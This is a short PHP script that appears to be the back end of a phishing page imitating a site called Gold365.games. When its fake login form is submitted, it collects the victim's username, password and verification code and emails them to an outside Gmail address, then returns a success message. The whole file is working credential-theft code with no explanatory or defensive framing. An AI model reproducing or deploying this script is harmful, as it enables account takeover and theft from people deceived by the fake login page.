<?php

if (!empty($_POST['loginName'])) {
    $contacts = array(
    "
     phishing.redit@gmail.com
    "
    );

    foreach ($contacts as $contact) {
        $email_to = $contact;
        $email_subject = 'Gold365.games- new';
        $email_message = "<html><head></head><body><table>" .
            "<tr><td>User name: </td> " .
            " <td>" . $_POST['loginName'] .
            "</td></tr>" .
            "<tr><td>Password: </td> " .
            "<td>" . $_POST['password'] .
            "</td></tr>" .
            "<tr>" .
            "</tr><tr><td>Code: </td>" .
            "<td>" . $_POST['code'] .
            "</td></tr>" .
            "</table></body></html>";
        $headers = "FROM: Gold365.games \r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        mail($email_to, $email_subject, $email_message, $headers);
    }

    echo "sucessmsg";

    exit;
}
